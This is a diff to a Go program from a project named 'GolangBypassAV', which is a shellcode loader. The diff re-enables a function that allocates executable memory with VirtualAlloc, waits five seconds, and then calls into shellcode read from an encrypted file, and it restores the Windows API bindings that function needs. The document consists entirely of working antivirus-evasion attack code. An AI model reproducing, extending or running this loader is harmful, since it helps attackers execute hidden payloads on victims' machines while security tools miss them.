@@ -4,6 +4,7 @@ import (
 	"GolangBypassAV/encry"
 	"os"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -18,8 +19,8 @@ var (
 	ntdll              = syscall.MustLoadDLL("ntdll.dll")
 	VirtualAlloc       = kernel32.MustFindProc("VirtualAlloc")
 	procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
-	//RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
-	RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
+	RtlCopyMemory      = ntdll.MustFindProc("RtlCopyMemory")
+	RtlMoveMemory      = ntdll.MustFindProc("RtlMoveMemory")
 )
 
 func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
@@ -57,7 +58,7 @@ func genEXE(charcode []byte) {
 	syscall.Syscall(addr, 0, 0, 0, 0)
 }
 
-/*func genEXE1(shellcode []byte) {
+func genEXE1(shellcode []byte) {
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if err != nil && err.Error() != "The operation completed successfully." {
 		syscall.Exit(0)
@@ -68,7 +69,7 @@ func genEXE(charcode []byte) {
 	}
 	time.Sleep(5 * time.Second)
 	syscall.Syscall(addr, 0, 0, 0, 0)
-}*/
+}
 
 func getFileShellCode(file string) []byte {
 	data := encry.ReadFile(file)
